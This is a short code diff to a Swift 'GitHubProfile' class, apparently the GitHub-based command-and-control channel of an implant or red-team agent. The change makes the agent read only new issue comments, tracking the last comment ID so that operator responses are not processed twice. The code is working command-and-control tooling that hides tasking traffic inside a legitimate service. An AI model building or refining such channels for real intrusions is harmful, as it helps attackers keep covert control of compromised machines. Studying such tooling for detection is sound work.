@@ -14,6 +14,7 @@ class GitHubProfile: C2Profile {
     private var connected: Bool = false
     private var isCheckedIn: Bool = false
     private var agentBranch: String = ""
+    private var lastCommentId: Int = 0  // Track last read comment to avoid reading same response twice
     
     var profileName: String {
         return "github"
@@ -134,7 +135,7 @@ class GitHubProfile: C2Profile {
         return success
     }
     
-    // Read the latest comment from a GitHub issue
+    // Read the latest NEW comment from a GitHub issue (only returns comments newer than lastCommentId)
     private func readLatestIssueComment(issueNumber: Int) -> String {
         dispatch.enter()
         var result = ""
@@ -157,8 +158,13 @@ class GitHubProfile: C2Profile {
                httpResponse.statusCode == 200 {
                 if let json = try? JSONSerialization.jsonObject(with: data) as? [[String: Any]],
                    let firstComment = json.first,
+                   let commentId = firstComment["id"] as? Int,
                    let body = firstComment["body"] as? String {
-                    result = body
+                    // Only return the comment if it's newer than the last one we read
+                    if commentId > self.lastCommentId {
+                        self.lastCommentId = commentId
+                        result = body
+                    }
                 }
             }
             self.dispatch.leave()
